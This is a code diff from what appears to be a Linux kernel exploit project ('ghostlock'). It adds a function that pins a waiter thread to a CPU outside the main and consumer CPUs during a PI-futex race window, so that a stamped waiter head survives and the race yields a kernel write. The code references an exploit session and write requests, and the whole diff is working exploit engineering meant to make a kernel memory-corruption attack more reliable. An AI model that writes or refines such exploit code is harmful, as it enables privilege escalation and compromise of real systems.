@@ -14,11 +14,42 @@
 
 using namespace ghostlock;
 
+namespace {
+    /* Pin the waiter off the main/consumer pair for the stamp->walk window: a
+     * context switch on the waiter's CPU during the window runs a deep kernel
+     * call chain on the thread's own stack and clobbers the stamped waiter head,
+     * turning the consumer's first rb_erase into a wild dereference. Gated by
+     * the route capability so only routes that need it pay the placement
+     * (docs/analysis/rt-sigreturn-window-hardening-plan.md). */
+    void pin_waiter_off_pair(const ghostlock::race::PiRace *race) {
+        /* A thread inherits the creator's affinity, and the main thread pins
+         * itself to main_cpu before the workers start, so this thread's own
+         * affinity mask only ever shows that one cpu. The allowed set is
+         * therefore probed by attempt: the first cpu outside the pair whose
+         * sched_setaffinity succeeds is the pin target. */
+        const long online = sysconf(_SC_NPROCESSORS_ONLN);
+        for (int32_t cpu = 0; cpu < static_cast<int32_t>(online); cpu++) {
+            if (cpu == race->main_cpu || cpu == race->consumer_cpu) continue;
+            cpu_set_t cpuset;
+            CPU_ZERO(&cpuset);
+            CPU_SET(cpu, &cpuset); // NOLINT(clang-analyzer-security.ArrayBound)
+            if (sched_setaffinity(0, sizeof(cpuset), &cpuset) == 0) {
+                pr_info("waiter thread pinned to cpu=%d\n", sched_getcpu());
+                return;
+            }
+        }
+        pr_warning("waiter pin skipped: no cpu outside main=%d consumer=%d is allowed\n",
+                   race->main_cpu, race->consumer_cpu);
+    }
+} // namespace
+
 namespace ghostlock::race {
     void *waiter_thread(void *arg) {
         auto *race = static_cast<PiRace *>(arg);
         const memory::WriteRequest *request = race->request;
         support::disable_rseq_for_thread();
+        if (route::route_needs_waiter_pin(session::g_exploit_session.profile))
+            pin_waiter_off_pair(race);
         int32_t tid = static_cast<int32_t>(syscall(SYS_gettid));
         race->waiter_tid.store(tid);
         if (support::futex_op(&race->chain_futex, FUTEX_LOCK_PI, 0, nullptr, nullptr, 0) != 0)
